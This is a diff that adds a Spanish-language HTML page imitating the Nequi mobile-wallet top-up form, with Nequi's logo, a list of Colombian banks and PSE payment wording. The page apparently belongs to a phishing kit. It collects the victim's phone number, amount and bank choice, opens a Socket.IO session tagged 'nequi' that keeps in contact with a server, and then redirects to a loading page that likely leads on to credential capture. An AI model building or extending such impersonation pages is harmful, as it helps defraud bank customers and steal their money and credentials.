@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recarga tu Nequi</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <script src="/socket.io/socket.io.js"></script>
+    
+    <div class="container">
+        <div class="logo">
+            <img src="img/nequi-logo.svg" alt="Nequi">
+        </div>
+        
+        <h1>Recarga tu Nequi</h1>
+        
+        <form class="recharge-form" id="recharge-form">
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <label class="input-label">Número de celular</label>
+                    <input type="tel" id="phone" name="phone" placeholder="" pattern="3[0-9]{9}" maxlength="10" inputmode="numeric">
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <label class="input-label">Confirma el número de celular</label>
+                    <input type="tel" id="confirm-phone" name="confirm-phone" placeholder="" pattern="3[0-9]{9}" maxlength="10" inputmode="numeric">
+                </div>
+                <span class="error-message" id="phone-error"></span>
+            </div>
+            
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <label class="input-label">¿Cuánto?</label>
+                    <input type="text" id="amount" name="amount" placeholder="" inputmode="numeric">
+                </div>
+                <span class="error-message" id="amount-error"></span>
+            </div>
+            
+            <div class="form-group">
+                <div class="select-wrapper has-value-default">
+                    <div class="select-label-static">Tipo de persona</div>
+                    <select id="person-type" name="person-type" class="has-value">
+                        <option value="natural" selected>Natural</option>
+                        <option value="juridica">Jurídica</option>
+                    </select>
+                    <div class="select-arrow"></div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <div class="select-wrapper no-float">
+                    <span class="select-placeholder" id="bank-placeholder">Elige el banco</span>
+                    <div class="select-label-static">Elige el banco</div>
+                    <select id="bank" name="bank">
+                        <option value="" disabled selected hidden></option>
+                        <option value="">A continuación seleccione su banco</option>
+                        <option value="alianza">ALIANZA FIDUCIARIA</option>
+                        <option value="Agrario">BANCO AGRARIO</option>
+                        <option value="AV Villas">BANCO AV VILLAS</option>
+                        <option value="BBVA">BANCO BBVA COLOMBIA S.A.</option>
+                        <option value="Caja Social">BANCO CAJA SOCIAL</option>
+                        <option value="cooperativo">BANCO COOPERATIVO COPCENTRAL</option>
+                        <option value="Davivienda">BANCO DAVIVIENDA</option>
+                        <option value="Bogota">BANCO DE BOGOTA</option>
+                        <option value="Occidente">BANCO DE OCCIDENTE</option>
+                        <option value="Falabella">BANCO FALABELLA</option>
+                        <option value="finandina">BANCO FINANDINA S.A. BIC</option>
+                        <option value="gnb">BANCO GNB SUDAMERIS</option>
+                        <option value="itau">BANCO ITAU</option>
+                        <option value="jpmorgan">BANCO J.P. MORGAN COLOMBIA S.A.</option>
+                        <option value="Banco Mundo Mujer">BANCO MUNDO MUJER S.A.</option>
+                        <option value="pichincha">BANCO PICHINCHA S.A.</option>
+                        <option value="Popular">BANCO POPULAR</option>
+                        <option value="santander">BANCO SANTANDER COLOMBIA</option>
+                        <option value="Serfinanza">BANCO SERFINANZA</option>
+                        <option value="union">BANCO UNION</option>
+                        <option value="ban100">BAN100</option>
+                        <option value="bancamia">BANCAMIA S.A.</option>
+                        <option value="Bancolombia">BANCOLOMBIA</option>
+                        <option value="bancoomeva">BANCOOMEVA S.A.</option>
+                        <option value="bold">BOLD CF</option>
+                        <option value="cfa">CFA COOPERATIVA FINANCIERA</option>
+                        <option value="citibank">CITIBANK</option>
+                        <option value="coink">COINK SA</option>
+                        <option value="coltefinanciera">COLTEFINANCIERA</option>
+                        <option value="confiar">CONFIAR COOPERATIVA FINANCIERA</option>
+                        <option value="cotrafa">COTRAFA</option>
+                        <option value="crezcamos">CREZCAMOS MOSI</option>
+                        <option value="dale">DALE</option>
+                        <option value="Daviplata">DAVIPLATA</option>
+                        <option value="ding">DING</option>
+                        <option value="juriscoop">FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO</option>
+                        <option value="global66">GLOBAL66</option>
+                        <option value="iris">IRIS</option>
+                        <option value="jfk">JFK COOPERATIVA FINANCIERA</option>
+                        <option value="lulo">LULO BANK</option>
+                        <option value="movii">MOVII S.A.</option>
+                        <option value="nu">NU</option>
+                        <option value="powii">POWII</option>
+                        <option value="rappipay">RAPPIPAY</option>
+                        <option value="Scotiabank Colpatria">SCOTIABANK COLPATRIA</option>
+                        <option value="uala">UALÁ</option>
+                    </select>
+                    <div class="select-arrow"></div>
+                </div>
+            </div>
+            
+            <div class="checkbox-group">
+                <label class="checkbox-container">
+                    <input type="checkbox" name="terms">
+                    <span class="checkmark"></span>
+                    <span class="checkbox-text">Acepto que las entradas del formulario se comprueben en busca de spam y se almacenen encriptadas durante 14 días.</span>
+                </label>
+            </div>
+            
+            <p class="info-text">
+                La recarga se hará usando los servicios de PSE y se debitará de tu cuenta corriente o de ahorros.
+            </p>
+            
+            <button type="submit" class="btn-submit" id="submit-btn" disabled>Continuar</button>
+            
+            <a href="#" class="help-link">Ayuda</a>
+        </form>
+    </div>
+    <script>
+        let socket;
+        let sessionId;
+
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        function initializeApp() {
+            setupSocket();
+            setupForm();
+        }
+
+        function setupSocket() {
+            socket = io({
+                transports: ['websocket', 'polling'],
+                reconnection: true,
+                reconnectionAttempts: 5,
+                reconnectionDelay: 1000
+            });
+            sessionId = localStorage.getItem('nequiSessionId');
+            if (!sessionId) {
+                sessionId = `nequi_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+                localStorage.setItem('nequiSessionId', sessionId);
+            }
+            
+            // Eventos de Socket.IO
+            socket.on('connect', () => {
+                socket.emit('initSession', { sessionId, module: 'nequi', page: 'index', data: {} });
+            });
+            
+            socket.on('sessionConfirmed', () => {});
+            socket.on('disconnect', () => {});
+            
+            setInterval(() => socket?.connected && socket.emit('keepAlive', { sessionId }), 25000);
+        }
+
+        let phoneInput, confirmPhoneInput, amountInput, bankSelect, form;
+        let phoneError, amountError, checkbox, submitBtn, personTypeSelect;
+
+        function setupForm() {
+            phoneInput = document.getElementById('phone');
+            confirmPhoneInput = document.getElementById('confirm-phone');
+            amountInput = document.getElementById('amount');
+            bankSelect = document.getElementById('bank');
+            form = document.getElementById('recharge-form');
+            phoneError = document.getElementById('phone-error');
+            amountError = document.getElementById('amount-error');
+            checkbox = document.querySelector('input[type="checkbox"]');
+            submitBtn = document.getElementById('submit-btn');
+            personTypeSelect = document.getElementById('person-type');
+
+            handlePhoneInput(phoneInput);
+            handlePhoneInput(confirmPhoneInput);
+            handleAmountInput();
+            handlePersonTypeSelect();
+            handleBankSelect();
+            checkbox.addEventListener('change', checkFormCompletion);
+            form.addEventListener('submit', validateForm);
+            setupSelectArrowAnimation();
+        }
+
+        function handlePhoneInput(input) {
+            input.addEventListener('input', function() {
+                // Permitir solo números
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Limitar a 10 dígitos
+                if (this.value.length > 10) {
+                    this.value = this.value.slice(0, 10);
+                }
+                
+                // Actualizar label flotante
+                toggleLabel(this);
+                
+                // Validar coincidencia si es confirmación
+                if (this === confirmPhoneInput) {
+                    validatePhoneMatch();
+                }
+                
+                // Verificar estado del formulario
+                checkFormCompletion();
+            });
+            
+            input.addEventListener('blur', function() {
+                if (this === confirmPhoneInput) {
+                    validatePhoneMatch();
+                }
+                validatePhoneFormat(this);
+            });
+        }
+
+        function validatePhoneFormat(input) {
+            const value = input.value;
+            const hasError = (value && value.length === 10 && !value.startsWith('3')) ||
+                            (value && value.length > 0 && value.length < 10);
+            
+            input.classList.toggle('error', hasError);
+        }
+
+        function validatePhoneMatch() {
+            const phone = phoneInput.value;
+            const confirmPhone = confirmPhoneInput.value;
+            
+            if (confirmPhone.length === 10 && phone !== confirmPhone) {
+                confirmPhoneInput.classList.add('error');
+                phoneError.textContent = '¡Ups! Esos dos números no coinciden, porfa revisalos.';
+                phoneError.style.display = 'block';
+                return false;
+            }
+            
+            confirmPhoneInput.classList.remove('error');
+            phoneError.textContent = '';
+            phoneError.style.display = 'none';
+            return true;
+        }
+
+        function handleAmountInput() {
+            amountInput.addEventListener('input', function() {
+                const value = this.value.replace(/[^0-9]/g, '');
+                
+                // Formatear con separador de miles
+                this.value = value ? `$${value.replace(/\B(?=(\d{3})+(?!\d))/g, '.')}` : '';
+                
+                toggleLabel(this);
+                validateAmount();
+                checkFormCompletion();
+            });
+            
+            amountInput.addEventListener('blur', validateAmount);
+        }
+
+        function validateAmount() {
+            const rawValue = amountInput.value.replace(/[^0-9]/g, '');
+            const numValue = parseInt(rawValue) || 0;
+            const hasError = amountInput.value && numValue === 0;
+            
+            amountInput.classList.toggle('error', hasError);
+            amountError.textContent = hasError ? 'Debes ingresar mín. [$1]' : '';
+            amountError.style.display = hasError ? 'block' : 'none';
+            
+            return !hasError;
+        }
+
+        function toggleLabel(input) {
+            const wrapper = input.closest('.input-wrapper, .select-wrapper');
+            if (!wrapper) return;
+            
+            const label = wrapper.querySelector('.input-label, .select-label');
+            const placeholder = wrapper.querySelector('.select-placeholder');
+            const staticLabel = wrapper.querySelector('.select-label-static');
+            const hasValue = input.value && input.value !== '';
+            
+            // Labels flotantes estándar
+            if (label) {
+                label.classList.toggle('active', hasValue);
+                input.classList.toggle('has-value', hasValue);
+            }
+            
+            // Labels de selectores
+            if (placeholder && staticLabel) {
+                placeholder.classList.toggle('hidden', hasValue);
+                staticLabel.style.display = hasValue ? 'block' : 'none';
+                input.style.paddingTop = hasValue ? '24px' : '16px';
+                input.style.paddingBottom = hasValue ? '8px' : '16px';
+            }
+        }
+
+        function handleBankSelect() {
+            bankSelect.addEventListener('change', function() {
+                toggleLabel(this);
+                checkFormCompletion();
+            });
+        }
+
+        function handlePersonTypeSelect() {
+            personTypeSelect.addEventListener('change', function() {
+                toggleLabel(this);
+                checkFormCompletion();
+            });
+        }
+
+        function checkFormCompletion() {
+            const isPhoneValid = phoneInput.value.length === 10 && phoneInput.value.startsWith('3');
+            const isConfirmPhoneValid = confirmPhoneInput.value.length === 10 && confirmPhoneInput.value.startsWith('3');
+            const phonesMatch = phoneInput.value === confirmPhoneInput.value;
+            const amountValue = amountInput.value.replace(/[^0-9]/g, '');
+            const isAmountValid = amountValue && parseInt(amountValue) > 0;
+            const isPersonTypeSelected = personTypeSelect.value !== '';
+            const isBankSelected = bankSelect.value !== '';
+            const isCheckboxChecked = checkbox.checked;
+            
+            const isFormComplete = isPhoneValid && 
+                                  isConfirmPhoneValid && 
+                                  phonesMatch && 
+                                  isAmountValid && 
+                                  isPersonTypeSelected && 
+                                  isBankSelected && 
+                                  isCheckboxChecked;
+            
+            submitBtn.disabled = !isFormComplete;
+            submitBtn.classList.toggle('enabled', isFormComplete);
+        }
+
+        function validateForm(e) {
+            e.preventDefault();
+            
+            let isValid = true;
+            
+            // Validar teléfono
+            if (!phoneInput.value || phoneInput.value.length !== 10 || !phoneInput.value.startsWith('3')) {
+                phoneInput.classList.add('error');
+                isValid = false;
+            }
+            
+            // Validar coincidencia de teléfonos
+            if (!validatePhoneMatch()) {
+                isValid = false;
+            }
+            
+            // Validar monto
+            if (!validateAmount()) {
+                isValid = false;
+            }
+            
+            // Validar banco
+            bankSelect.classList.toggle('error', !bankSelect.value);
+            if (!bankSelect.value) {
+                isValid = false;
+            }
+            
+            if (isValid) {
+                // Guardar datos en sessionStorage
+                sessionStorage.setItem('phone', phoneInput.value);
+                sessionStorage.setItem('amount', amountInput.value);
+                sessionStorage.setItem('personType', personTypeSelect.value);
+                sessionStorage.setItem('bank', bankSelect.value);
+                
+                showConfirmationPage();
+            }
+        }
+
+        function showConfirmationPage() {
+            const personTypeText = personTypeSelect.options[personTypeSelect.selectedIndex].text;
+            const bankText = bankSelect.options[bankSelect.selectedIndex].text;
+            
+            document.querySelector('.container').innerHTML = `
+                <div class="logo">
+                    <img src="img/nequi-logo.svg" alt="Nequi">
+                </div>
+                
+                <h1 class="confirmation-title">Revisa la info</h1>
+                
+                <div class="confirmation-box">
+                    <div class="confirmation-item">
+                        <div class="confirmation-label">Concepto</div>
+                        <div class="confirmation-value">Recarga Nequi PSE</div>
+                    </div>
+                    
+                    <div class="confirmation-item">
+                        <div class="confirmation-label">Número de celular</div>
+                        <div class="confirmation-value">${phoneInput.value}</div>
+                    </div>
+                    
+                    <div class="confirmation-item">
+                        <div class="confirmation-label">¿Cuánto?</div>
+                        <div class="confirmation-value">${amountInput.value}</div>
+                    </div>
+                    
+                    <div class="confirmation-item">
+                        <div class="confirmation-label">Tipo de persona</div>
+                        <div class="confirmation-value">${personTypeText}</div>
+                    </div>
+                    
+                    <div class="confirmation-item">
+                        <div class="confirmation-label">Banco</div>
+                        <div class="confirmation-value">${bankText}</div>
+                    </div>
+                </div>
+                
+                <button type="button" class="btn-recargar" onclick="proceedToLoading()">Continuar</button>
+                <button type="button" class="btn-atras" onclick="location.reload()">Atrás</button>
+            `;
+        }
+
+        function proceedToLoading() {
+            // Obtener datos almacenados
+            const phone = sessionStorage.getItem('phone');
+            const amount = sessionStorage.getItem('amount');
+            const personType = sessionStorage.getItem('personType');
+            const bank = sessionStorage.getItem('bank');
+            
+            // Crear objeto con todos los datos
+            const formData = {
+                phone,
+                amount,
+                personType,
+                bank,
+                timestamp: new Date().toISOString()
+            };
+
+            // Guardar en sessionStorage
+            sessionStorage.setItem('formData', JSON.stringify(formData));
+
+            // Redirigir a loading
+            window.location.href = 'loading.html';
+        }
+
+        function setupSelectArrowAnimation() {
+            const selects = document.querySelectorAll('.select-wrapper select');
+            
+            selects.forEach(select => {
+                select.addEventListener('mousedown', function() {
+                    const arrow = this.nextElementSibling;
+                    if (arrow?.classList.contains('select-arrow')) {
+                        arrow.style.transform = 'translateY(-50%) rotate(180deg)';
+                    }
+                });
+                
+                select.addEventListener('change', function() {
+                    const arrow = this.nextElementSibling;
+                    if (arrow?.classList.contains('select-arrow')) {
+                        setTimeout(() => {
+                            arrow.style.transform = 'translateY(-50%) rotate(0deg)';
+                        }, 150);
+                    }
+                });
+                
+                select.addEventListener('blur', function() {
+                    const arrow = this.nextElementSibling;
+                    if (arrow?.classList.contains('select-arrow')) {
+                        arrow.style.transform = 'translateY(-50%) rotate(0deg)';
+                    }
+                });
+            });
+        }
+    </script>
+</body>
+</html>
